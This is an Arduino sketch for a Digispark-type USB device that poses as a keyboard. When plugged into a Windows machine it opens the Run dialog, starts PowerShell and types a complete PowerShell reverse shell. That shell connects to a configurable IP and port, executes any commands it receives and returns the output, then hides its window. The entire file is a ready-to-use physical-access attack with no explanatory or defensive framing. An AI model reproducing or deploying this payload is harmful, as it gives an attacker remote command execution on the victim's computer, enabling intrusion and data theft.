#include "DigiKeyboardFr.h"

#define IP "127.0.0.1"
#define PORT "4444"

const short time_default = 500;
const short time_run = 2000;
const char led_id = 1;

void setup() {
  pinMode(led_id, OUTPUT);
}

void loop() {
  digitalWrite(led_id, LOW);
  DigiKeyboardFr.update();
  DigiKeyboardFr.sendKeyStroke(0);
  DigiKeyboardFr.delay(time_default);
  DigiKeyboardFr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboardFr.delay(time_default);
  DigiKeyboardFr.println("powershell");
  DigiKeyboardFr.delay(time_run);
  DigiKeyboardFr.println("cls;$c=New-Object System.Net.Sockets.TCPClient('"IP"',"PORT");$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$y=(iex $d 2>&1|Out-String);$x=([text.encoding]::ASCII).GetBytes($y);$s.Write($x,0,$x.Length);$s.Flush()};$c.Close();exit");
  DigiKeyboardFr.sendKeyStroke(KEY_ARROW_DOWN, MOD_GUI_LEFT);
  digitalWrite(led_id, HIGH);
  for (;;) {
  }
}
